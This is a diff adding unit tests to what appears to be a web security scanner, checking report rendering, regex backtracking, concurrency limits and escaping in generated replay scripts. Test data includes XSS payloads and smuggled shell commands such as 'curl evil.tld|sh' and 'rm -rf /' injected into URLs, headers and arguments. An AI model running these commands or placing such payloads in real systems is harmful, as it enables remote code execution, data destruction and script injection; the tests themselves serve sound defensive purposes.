@@ -1214,5 +1214,195 @@ class AccountingTests(unittest.TestCase):
         self.assertEqual(c.attempts, 0, "nothing was sent, so nothing was attempted")
 
 
+class ReportRenderTests(unittest.TestCase):
+    """The report was crashing for a whole release because nothing rendered one.
+
+    A format-string argument was added without its placeholder, so every field
+    after it shifted. Structural checks on a pre-generated file cannot catch
+    that - only actually building a report can.
+    """
+
+    HOSTILE = '</script><img src=x onerror=alert(1)>'
+    ATTR_BREAK = '" onmouseover="alert(2)'
+
+    def _store(self, **kw):
+        import os, tempfile
+        from assay.models import Evidence, Finding
+        from assay.store import Store
+        s = Store(os.path.join(tempfile.mkdtemp(), "assay.db"))
+        s.start_run("standard", ["t"])
+        s.add_finding(Finding(
+            title=kw.get("title", "Exposed .env file"),
+            target=kw.get("target", "https://a.test/.env"),
+            severity="critical", confidence="confirmed", module="exposure",
+            category="A05 Security Misconfiguration", cwe="CWE-540",
+            impact=kw.get("impact", "Live credentials in cleartext."),
+            detail=kw.get("detail", "matched DB_PASSWORD="),
+            repro=kw.get("repro", "curl -sSk https://a.test/.env"),
+            tags=["exposure", "verified"],
+            evidence=[Evidence(kind="http", label="proof",
+                               output=kw.get("evidence", "DB_PASSWORD=x"))]))
+        return s
+
+    def _build(self, store, **kw):
+        import os, tempfile
+        from assay import report
+        out = os.path.join(tempfile.mkdtemp(), "r.html")
+        return open(report.build(store, {"hosts": 1, "web": 1, "requests": 5,
+                                         "duration": 2.0}, out, **kw)).read()
+
+    def test_report_builds_at_all(self):
+        html = self._build(self._store())
+        self.assertIn("Exposed .env file", html)
+        self.assertIn("</html>", html)
+
+    def test_report_builds_with_no_findings(self):
+        import os, tempfile
+        from assay.store import Store
+        s = Store(os.path.join(tempfile.mkdtemp(), "assay.db"))
+        s.start_run("standard", ["t"])
+        self.assertIn("</html>", self._build(s))
+
+    def test_live_and_final_variants_both_build(self):
+        s = self._store()
+        # 'livebar' also appears in the stylesheet, so match the element.
+        self.assertIn('id="livebar"', self._build(s, live=True))
+        self.assertNotIn('id="livebar"', self._build(s, live=False))
+
+    def test_report_with_ai_and_chains_builds(self):
+        s = self._store()
+        fid = list(s.iter_findings())[0].fingerprint()
+        s.save_ai({"triage": [{"id": fid, "verdict": "report", "priority": 1,
+                               "false_positive_risk": "low", "rationale": "r",
+                               "impact_statement": "i", "next_steps": ["do x"],
+                               "commands": ["curl https://a.test/"]}],
+                   "chains": [{"name": "c", "combined_severity": "critical",
+                               "finding_ids": [fid], "combined_impact": "x",
+                               "steps": ["s1"]}]})
+        html = self._build(s, ai={"summary": "s", "_model": "m"})
+        self.assertIn("Attack chains", html)
+        self.assertIn("AI triage", html)
+
+    def test_hostile_content_cannot_break_out_of_the_page(self):
+        """Titles, evidence and URLs all come from the target."""
+        import re
+        s = self._store(title="T " + self.HOSTILE, impact="I " + self.ATTR_BREAK,
+                        detail=self.HOSTILE, evidence=self.HOSTILE,
+                        target="https://a.test/" + self.HOSTILE)
+        html = self._build(s)
+        self.assertNotIn("</script><img", html)
+        self.assertNotIn('" onmouseover="alert', html)
+        self.assertFalse(re.search(r"<img\s[^>]*onerror", html),
+                         "payload parsed as markup")
+        for m in re.finditer(r"<script[^>]*>(.*?)</script>", html, re.S):
+            self.assertNotIn("alert(", m.group(1),
+                             "hostile content reached a script block")
+
+    def test_zero_counts_render_as_zero_not_blank(self):
+        """`str(x or "")` silently blanks a zero, which reads as missing data."""
+        import re
+        html = self._build(self._store())
+        tiles = re.findall(r'<div class="num"[^>]*>([^<]*)</div>', html)
+        self.assertTrue(tiles, "no tiles rendered")
+        self.assertNotIn("", tiles, "a tile rendered blank instead of a number")
+
+    def test_every_severity_and_triage_renders(self):
+        import os, tempfile
+        from assay.models import Evidence, Finding
+        from assay.store import Store
+        s = Store(os.path.join(tempfile.mkdtemp(), "assay.db"))
+        s.start_run("standard", ["t"])
+        for sev in ("critical", "high", "medium", "low", "info"):
+            s.add_finding(Finding(title="F " + sev, target="https://a/", severity=sev,
+                                  confidence="firm", module="m", impact="i",
+                                  evidence=[Evidence(kind="http", output="x")]))
+        html = self._build(s)
+        for sev in ("critical", "high", "medium", "low", "info"):
+            self.assertIn("F " + sev, html)
+
+
+class RegexBudgetTests(unittest.TestCase):
+    """Patterns run against response bodies the target controls."""
+
+    ADVERSARIAL = [
+        "A" * 40000, ("a" * 500 + "!") * 40, "<" * 20000,
+        "https://" + "a." * 2000 + "!", "'" * 5000, "x=" * 10000,
+        "/" + "a/" * 5000, '"' + "b" * 20000, "0123456789" * 4000,
+        '<script src="' + "a" * 3000,
+    ]
+
+    def _all_patterns(self):
+        from assay import domains, redact, urls
+        from assay.modules import secrets, web_exposure, web_sqli
+        pats = []
+        for mod, names in ((urls, "JS_PATH_RE JS_URL_RE JS_CALL_RE ASSET_RE JS_NOISE_RE"),
+                           (domains, "CSP_HOST_RE"),
+                           (secrets, "INTERNAL_HOST_RE SCRIPT_RE SOURCEMAP_RE")):
+            for n in names.split():
+                pats.append((n, getattr(mod, n)))
+        pats += [(e, r) for e, r in web_sqli.DB_ERRORS]
+        pats += [(l, r) for l, _s, r, _w in secrets.SECRET_PATTERNS]
+        pats += [(k, r) for k, r in redact.DETECTORS + redact.NETWORK_DETECTORS]
+        pats += [(sig["path"], sig["_re"]) for sig in web_exposure.load_signatures()]
+        return pats
+
+    def test_no_pattern_backtracks_catastrophically(self):
+        import time
+        slow = []
+        for name, rx in self._all_patterns():
+            for body in self.ADVERSARIAL:
+                t0 = time.time()
+                rx.search(body)
+                dt = time.time() - t0
+                if dt > 0.25:
+                    slow.append((name, round(dt, 2)))
+        self.assertEqual(slow, [], "catastrophic backtracking: %s" % slow)
+
+
+class ConcurrencyTests(unittest.TestCase):
+    def test_url_pool_respects_the_cap_under_contention(self):
+        import threading
+        from assay.config import Config
+        from assay.context import Context
+
+        class _S:
+            def add_finding(self, f): return True
+        ctx = Context(cfg=Config(), store=_S(), http=None, tune={})
+        threads = [threading.Thread(
+            target=lambda n=i: ctx.add_urls(
+                "https://a", ["https://a/%d" % k for k in range(n, n + 40)], 50))
+            for i in range(0, 80, 5)]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join()
+        bucket = ctx.urls["https://a"]
+        self.assertLessEqual(len(bucket), 50)
+        self.assertEqual(len(bucket), len(set(bucket)), "duplicates leaked in")
+
+
+class ReplaySafetyTests(unittest.TestCase):
+    def test_target_controlled_values_cannot_inject_into_replay(self):
+        """replay.sh is executable; URLs and headers come from the target."""
+        import tempfile
+        from assay.journal import Journal
+        j = Journal(tempfile.mkdtemp())
+        j.open(["t"], "standard")
+        j.request("GET", "https://a.test/x';curl evil.tld|sh;#",
+                  {"X-H": "v'; curl evil.tld | sh; #"})
+        j.command(["nmap", "-sV", "10.0.0.1; rm -rf /"])
+        j.close()
+        replay = open(j.replay_path).read()
+        for line in replay.splitlines():
+            if line.startswith("#") or not line.strip():
+                continue
+            # Every metacharacter must sit inside a quoted string.
+            import shlex
+            tokens = shlex.split(line)
+            self.assertNotIn("sh", [t.strip() for t in tokens[1:] if t == "sh"],
+                             "a bare 'sh' token means the quoting failed")
+        self.assertIn("'10.0.0.1; rm -rf /'", replay)
+
+
 if __name__ == "__main__":
     unittest.main(verbosity=2)
